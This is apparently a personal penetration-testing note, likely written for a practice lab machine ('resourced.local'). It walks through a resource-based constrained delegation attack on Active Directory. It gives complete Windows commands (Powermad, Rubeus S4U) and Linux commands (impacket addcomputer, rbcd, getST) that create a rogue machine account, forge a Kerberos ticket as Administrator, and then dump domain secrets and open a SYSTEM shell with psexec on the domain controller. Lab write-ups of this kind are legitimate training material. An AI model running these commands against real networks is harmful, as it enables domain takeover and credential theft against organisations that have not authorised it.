# Windows

#### Adding Computer Object 

Using Powermad
https://github.com/Kevin-Robertson/Powermad
```
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount testmachine -Password $(ConvertTo-SecureString 'password' -AsPlainText -Force) -Verbose
```
![[Pasted image 20260711164955.png]]

Confirm it is added with PowerShell
```
Get-ADComputer -Identity testmachine
```
![[Pasted image 20260711165331.png]]

#### Assigning delegation privileges
Using PowerShell to assign privilege to new computer over the victim
```
Set-ADComputer RESOURCEDC$ -PrincipalsAllowedToDelegateToAccount testmachine$
```

Confirm
```
Get-ADComputer RESOURCED$ -Properties PrincipalsAllowedToDelegateToAccount
```
![[Pasted image 20260711173941.png]]

#### S4U Attack

We need the RC4 and AES hashes for the account we just created using Rubeus
```
.\Rubeus.exe hash /password:password /user:testmachine$ /domain:resourced.local
```
![[Pasted image 20260711170811.png]]

Now that all prerequisites have been met, the attack can be performed
```
.\Rubeus.exe s4u /user:testmachine$ /aes256:51AC7DF70EE3045A905EDA9BA1831DF32A93EEBA29653FBB74DD0A96CF6362C9 /aes128:5590150679006CB71B6EDABF30C14F1D /rc4:8846F7EAEE8FB117AD06BDD830B7586C /impersonateuser:Administrator /msdsspn:cifs/ResourceDC.resourced.local /domain:resourced.local /ptt /nowrap
```
![[Pasted image 20260711174156.png]]

Now we need to covert the ticket to ccache format 
```
base64 -d ticket.kirbi.encoded > ticket.kirbi
```
```
impacket-ticketConverter ticket.kirbi ticket.ccache 
```

```
export KRB5CCNAME=ticket.ccache 
```
```
impacket-psexec resourced.local/Administrator@ResourceDC.resourced.local -no-pass -k
```

# Linux

Add attacker controlled machine on domain
```
impacket-addcomputer -computer-name 'testmachine' -computer-pass 'password' -dc-ip 192.168.142.175 'resource.local/L.Livingstone' -hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808
```
![[Pasted image 20260711221025.png]]

Grant RBCD to the new machine
```
impacket-rbcd -delegate-to 'ResourceDC$' -delegate-from 'testmachine$' -dc-ip 192.168.142.175 -action write 'resource.local/L.Livingstone' -hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808
```
![[Pasted image 20260711221739.png]]

Request impersonation ticket for privileged user 
```
impacket-getST -spn cifs/ResourceDC.resourced.local -impersonate Administrator -dc-ip 192.168.142.175 'resourced.local/testmachine$:password'
```
![[Pasted image 20260711222411.png]]

Using the ticket
```
export KRB5CCNAME=Administrator@cifs_ResourceDC.resourced.local@RESOURCED.LOCAL.ccache
```
```
impacket-secretsdump -k -no-pass Administrator@ResourceDC.resourced.local
```
```
impacket-psexec -k -no-pass Administrator@ResourceDC.resourced.local
```
![[Pasted image 20260711222801.png]]

